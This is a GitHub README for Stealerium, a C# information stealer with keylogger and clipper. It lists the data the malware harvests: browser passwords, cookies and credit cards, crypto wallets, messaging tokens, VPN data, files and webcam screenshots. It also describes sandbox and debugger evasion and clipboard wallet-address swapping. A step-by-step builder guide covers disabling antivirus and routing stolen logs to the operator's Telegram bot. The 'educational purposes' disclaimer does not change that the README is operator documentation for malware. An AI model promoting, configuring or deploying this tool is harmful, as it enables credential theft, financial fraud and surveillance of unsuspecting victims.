<p align="center">
  <img src="https://user-images.githubusercontent.com/73314940/227033966-765bde5a-438d-4b97-844b-f70c67ac6352.jpg"><br>
  <strong>Stealer + Clipper + Keylogger</strong><br>
  <em>A Stealer written in C#, designed to send logs to your Telegram bot.</em>
</p>

<p align="center">
  <a href="https://github.com/Stealerium/Stealerium/actions/workflows/dotnet.yml">
    <img src="https://github.com/Stealerium/Stealerium/actions/workflows/dotnet.yml/badge.svg" alt="Build Stealerium">
  </a>
</p>

## 🚧 Disclaimer

<p align="center">This program is intended for educational purposes only.<br>
Your use of this program is at your own responsibility.<br>
The author will not be held liable for any illegal activities.</p>

## 🔍 Data Extraction

- [x] AntiAnalysis (VirtualBox, SandBox, Debugger, VirusTotal, Any.Run)
- [x] System Information (Version, CPU, GPU, RAM, IPs, BSSID, Location, Screen Metrics, Installed Apps)
- [x] Chromium-Based Browsers (Passwords, Credit Cards, Cookies, History, Autofill, Bookmarks)
- [x] Firefox-Based Browsers (Database Files, Cookies, History, Bookmarks)
- [x] Internet Explorer/Edge (Passwords)
- [x] Saved WiFi Networks & Scans around Device (SSID, BSSID)
- [x] File Grabber (Documents, Images, Source Codes, Databases, USB)
- [x] Detection of Banking & Cryptocurrency Services in Browsers
- [x] Gaming Sessions (Steam, Uplay, Battle.Net, Minecraft)
- [x] Installation of Keylogger & Clipper
- [x] Screenshots (Desktop & Webcam)
- [x] VPN Clients (ProtonVPN, OpenVPN, NordVPN)
- [x] Crypto Wallets
  - Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, Electrum,
    AtomicWallet, Guarda, Coinomi, Litecoin, Dash, Bitcoin, etc.
- [x] Browser Crypto Wallet Extensions (Chrome & Edge)
  - Binance, Coin98, Phantom, Mobox, XinPay, Math10, Metamask, BitApp,
    Guildwallet, Iconex, Sollet, Slope Wallet, Starcoin, Swash, Finnie,
    KEPLR, Crocobit, OXYGEN, Nifty, Liquality, Auvitas Wallet, Math
    Wallet, MTV Wallet, Rabet Wallet, Ronin Wallet, Yoroi Wallet, ZilPay
    Wallet, Exodus, Terra Station, Jaxx, etc.
- [x] Messaging Sessions, Accounts, Tokens
  - Discord, Telegram, ICQ, Skype, Pidgin, Outlook, Tox, Element, Signal, etc.
- [x] Directory Structure
- [x] FileZilla Hosts
- [x] Process List
- [x] Product Key
- [x] Autorun Module

## 🔥 Features

These functions are available in the builder only if autorun is enabled:

- **🎹 Keylogger:** Activates when the user types in chat or accesses a banking website.
- **📋 Clipper:** Engages and alters crypto wallet addresses in the clipboard during transactions.
- **📷 Webcam Screenshots:** Captured if the user views inappropriate content online.

## 🔨 Builder
- Temporarly disable your Antivirus
- Download Stealerium.zip from https://github.com/Stealerium/Stealerium/releases and extract the zip content to a deseired folder.
- Run BuilderGUI.exe
- Go to the [@BotFather](https://t.me/BotFather) bot and create your own bot. You need to save token and bot name.
- Now you need to get your chat id. To do this, go to the next bot [@chatid_echo_bot](https://t.me/GetMyChatID_Bot) and save the id.
- Insert this data in BuilderGUI
- Configure desired options
- Hit Build and enjoy!
<img width="600" alt="BuilderGUI" src="https://github.com/user-attachments/assets/db056797-cbae-4e04-a18a-32d27f2ade01">

## 📢 Channel Webhook
<img width="600" src="https://user-images.githubusercontent.com/73314940/165986700-8109a5ab-a1e1-4e50-8e91-90e72eb41af1.png">


## Requirements

To build from source, you'll need:

- [Visual Studio 2022 (v17.\*)](https://visualstudio.microsoft.com/vs/)
- [.NET SDK 6.0.\*](https://dotnet.microsoft.com/en-us/download/dotnet/6.0) (included with Visual Studio 2022)
- [.NET Framework SDK 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net48) (included with Visual Studio 2022)

## Runtime Requirements

Required if you download the release from [Releases](https://github.com/Stealerium/Stealerium/releases):

- Builder.exe ([.NET Runtime 6.0.\*](https://dotnet.microsoft.com/en-us/download/dotnet/6.0))
- Stub ([.NET Framework 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net48))
